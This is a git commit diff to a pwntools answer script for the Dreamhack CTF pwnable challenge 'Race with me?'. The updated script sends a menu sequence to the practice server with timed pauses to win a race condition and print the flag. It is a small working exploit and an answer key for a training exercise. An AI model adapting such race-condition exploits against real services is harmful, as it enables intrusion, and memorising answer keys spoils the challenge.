6cd5aa1428e78ad19226f678ad4569bc075711b7
Brian Lee <hibrian827@gmail.com>
2025-03-10 22:16:14 +0900

    changed answer of Race with me?

--- Dreamhack/Pwnable/Race with me/answer/answer.py
+++ Dreamhack/Pwnable/Race with me/answer/answer.py
@@ -1,14 +1,12 @@
 from pwn import *
 
-port = 8652
+port = 11055
 rem = remote("host3.dreamhack.games", port)
 
-while True:
-  rem.sendlineafter(b"Input: ", b"2")
-  rem.sendlineafter(b"Input: ", b"1")
-  rem.sendlineafter(b"Input: ", b"3735928559")
-  rem.sendlineafter(b"Input: ", b"3")
-  res = rem.recvline(0.5)
-  if b"Flag" in res:
-    print(res)
-    break
+rem.sendlineafter(b"Input: ", b"2")
+pause(2)
+rem.sendlineafter(b"Input: ", b"1")
+rem.sendlineafter(b"Input: ", b"3735928559")
+pause(0xA - 2)
+rem.sendlineafter(b"Input: ", b"3")
+print(rem.recvline())
